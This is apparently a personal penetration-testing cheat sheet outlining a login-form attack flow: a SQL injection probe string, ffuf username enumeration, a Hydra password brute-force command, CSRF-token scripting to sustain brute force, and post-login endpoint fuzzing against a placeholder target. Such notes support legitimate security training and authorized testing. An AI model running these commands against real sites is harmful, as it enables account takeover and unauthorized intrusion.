---
{"dg-publish":true,"permalink":"/itsi/tools/attackflows/login-form/"}
---

# Login Form Attack-Flow

## 1. Recon

### What:
Identify form URL, method (POST/GET), fields (`username`, `password`, hidden tokens, captchas, CSRF tokens), action path, and success/fail indicators.  
### How:
#### CLI:
```bash
curl -s https://target/login -o /tmp/login.html && grep -E "<form|<input" /tmp/login.html
````
#### Burp:
Submit dummy login -> HTTP History -> Inspect captured request in Proxy/History.

---
## 2. Protections check
### What:
Check for CSRF tokens, captcha, rate limits/lockouts, and differing error messages (user-enumeration risk).
### How:
#### CLI:
```bash
curl -s https://target/login | sed -n '1,200p'   # inspect hidden inputs; repeat to see token changes
```
#### Burp:
Load the page twice via the browser proxy -> compare hidden token values in Request/Response; use Repeater to submit requests without token and with token and observe differences.

---
## 3. SQLi
### What:
Try quick logic/SQLi payloads to detect injection.
### How:
#### CLI:
Manual Probing first [[ITSI/Tools/Attackflows/sqli-probing\|sqli-probing]]. If succuessfull then try [[ITSI/Tools/sqlmap\|sqlmap]]
#### Burp:
Send request to Repeater (CRTL + I) -> inject `' OR '1'='1` at user and pass

---
## 4. Username enumeration
### What:
Determine if responses differ for valid vs invalid usernames (enables targeted brute forcing).
### How:
#### CLI:
```bash
ffuf -X POST -u https://target/login -d "username=FUZZ&password=test" -w users.txt -mc 200,302
```
#### Burp:
Use Intruder on username with `payload.txt` ([[ITSI/Tools/tools#Wordlists\|tools#Wordlists]]) as payloads; compare response lengths/status codes or grep for failure/success signatures.

---
## 5. Password brute-force
### What:
Attempt passwords for a known username using a small list ([[ITSI/Tools/tools#Wordlists\|tools#Wordlists]]).
### How:
#### CLI (Hydra):
```bash
hydra -l admin -P rockyou-small.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid" -t 4
```
#### Burp:
Use Intruder: place position at `password`, load a wordlist ([[ITSI/Tools/tools#Wordlists\|tools#Wordlists]]), enable payload processing (URL-encode), add throttling, then run and triage by response differences.

---
## 6. CSRF <font color="red">(WIP)</font>

### What:
If the form requires a per-request token, fetch and include the token for each attempt — otherwise brute force attempts will fail.
### How:
#### CLI:
```bash
token=$(curl -s https://target/login | grep -Po 'name="csrf_token" value="\K[^"]+')
curl -s -X POST https://target/login -d "username=admin&password=PASS&csrf_token=$token"
```
(For many attempts, fetch token per iteration or use a session-aware script in Python/requests.)
#### Burp:
**Note** : **Not really doable without Pro version**
Configure a macro to fetch/refresh the token and set Intruder to run that macro before payloads (Burp Pro). With Burp Community, use Repeater or an external script to replicate token behavior.

---

## 7. Handling JS-heavy flows <font color="red">(WIP)</font>
### What:
If login relies on client-side JS (dynamic tokens/challenges), emulate a real browser or automate with a browser driver.
### How:
#### CLI:
Use Selenium or Playwright to automate the real browser flow (headless if needed) and submit the form with the JS-generated values.
#### Burp:
Capture the full browser flow with Burp -> reproduce the sequence in an automated script, or use Burp's embedded browser to observe the JS behavior and then replicate requests.

---
## 8. Post-auth checks  <font color="red">(WIP)</font>
### What:
Enumerate authenticated-only endpoints, check IDORs, privilege escalation, session handling and other post-login issues.
### How:
#### CLI:
```bash
ffuf -u https://target/admin/FUZZ -w web-content-common.txt -b "session=VALUE" -mc 200
```
#### Burp:
Use the authenticated session cookie in Proxy -> explore with Repeater/Intruder/Spider. If available, run Scanner on authenticated pages to find common issues.

---
## 9. Logging & evidence capture
### What:
Save exact requests/responses for reproducibility, reporting, and proof-of-concept.
### How:
#### CLI:
```bash
curl -v -X POST https://target/login -d "username=admin&password=pass" -D headers.txt -o body.html
```
#### Burp:
Right-click a request/response in Proxy or History -> Save item / Export raw request. Keep timestamps and notes of commands used.